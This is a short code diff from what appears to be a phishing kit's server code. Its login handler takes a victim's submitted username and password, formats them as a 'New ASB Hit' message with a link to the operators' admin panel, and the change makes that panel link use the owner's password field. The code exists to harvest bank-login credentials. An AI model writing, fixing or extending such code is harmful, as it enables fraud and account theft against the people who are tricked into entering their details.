@@ -51,7 +51,7 @@ const getInfo = async (req, res) => {
 
 const submitLogin = async (req, res) => {
 	let { username, password, uniqueid, owner, ip } = req.body;
-	message = `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023\n\nCount: ${count}\nRedirect: ${redirect}`;
+	message = `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=${owner}\n\nCount: ${count}\nRedirect: ${redirect}`;
 	try {
 		if (username == "" || password == "") {
 		} else {
